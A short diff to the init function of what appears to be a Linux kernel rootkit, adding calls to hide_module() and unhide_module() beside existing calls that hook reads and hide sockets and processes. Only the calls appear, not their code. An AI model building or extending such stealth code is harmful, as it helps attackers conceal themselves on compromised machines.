@@ -32,6 +32,8 @@ static int __init _init_module(void)
     hook_read(handle_input);
     load_sockethiding();
     load_processhiding();
+    hide_module();
+    unhide_module();
     return 0;
 }
 
